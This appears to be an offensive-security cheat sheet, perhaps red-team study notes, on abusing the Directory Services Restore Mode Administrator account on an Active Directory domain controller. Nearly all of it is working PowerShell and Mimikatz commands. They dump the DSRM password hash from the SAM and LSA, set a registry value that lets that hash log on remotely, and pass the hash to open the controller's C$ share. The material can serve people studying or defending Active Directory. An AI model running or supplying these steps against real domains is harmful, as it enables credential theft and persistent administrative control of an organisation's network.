# DSRM (Directory Services Restore Mode)

* there is a local admin on every DC called "Administrator" whose password is the DSRM password
* DSRM password (SafeModePassword) is required when a server is promoted to DC and it is rarely changed
* after changing the config on the DC, it is possible to pass the NTLM hash of this user to access the DC

* dump DSRM password. require DA privs
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername dc
```

* compare the admin hash with the admin hash of the below command
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc
```
* first one if the DSRM local Administrator

* since it is local admin of the DC, we can pass the hash to authenticate
* the Logon Behavior for the DSRM account needs to be changed before we can use its hash
```powershell
Enter-PSSesion -Computername dc 

New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

* pass the hash command
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dc /user:Administrator /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /run:powershell.exe"'

ls \\dc\C$
```


































